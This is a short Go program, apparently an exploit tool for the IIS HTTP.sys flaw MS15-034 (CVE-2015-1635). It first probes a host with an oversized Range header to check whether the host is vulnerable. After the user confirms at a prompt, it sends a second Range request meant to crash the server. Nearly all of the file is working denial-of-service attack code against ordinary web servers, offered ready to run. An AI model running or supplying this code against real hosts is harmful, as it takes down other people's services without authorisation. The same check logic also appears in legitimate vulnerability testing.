package main


/*
		MS15-034: HTTP.sys (IIS) DoS
		CVE-2015-1635

		https://www.mehmetince.net/ms15-034-http-sys-remote-code-execution-zafiyeti-ve-dos-saldirisi/
*/

import (
	"os"
	"fmt"
	"log"
	"net"
	"strings"
)



func CheckVuln(url string) bool {
	conn, err := net.Dial("tcp", url + ":80")
	if err != nil {
		log.Fatal(err)
	}

	defer conn.Close()

	Payload := fmt.Sprintf("GET /welcome.png HTTP/1.1\r\nHost: %s\r\nRange: bytes=0-18446744073709551615\r\n\r\n", url)
	conn.Write([]byte(Payload))
	tmp := make([]byte, 1024)
	conn.Read(tmp)

	if strings.Contains(string(tmp), "416 Requested Range Not Satisfiable") {
		return true
	} else {
		return false
	}

	return false

}

func main() {
	var tmp string
	if len(os.Args) != 0x2 {
		fmt.Println("Usage: ./CVE-2015-1635 <host>")
		os.Exit(0x1)
	}

	if CheckVuln(os.Args[0x1]) != true {
		fmt.Printf("Host is not vulnerable!\n")
		os.Exit(0x1)
	} else {
		fmt.Printf("Host is vulnerable!\n")
		fmt.Println("Do you want use exploit? (Y/N)")
		fmt.Scanf("%s", &tmp)
		if tmp == "Y" {
			fmt.Printf("Attacking %s!\n", os.Args[0x1])
			func() {
				conn, err := net.Dial("tcp", os.Args[0x1] + ":80")
				if err != nil {
					log.Fatal(err)
				}
				defer conn.Close()
				Payload := fmt.Sprintf("GET /welcome.png HTTP/1.1\r\nHost: %s\r\nRange: bytes=18-18446744073709551615\r\n\r\n", os.Args[0x1])
				conn.Write([]byte(Payload))
			}()
		} else {
			os.Exit(0x1)
		}
	}
}
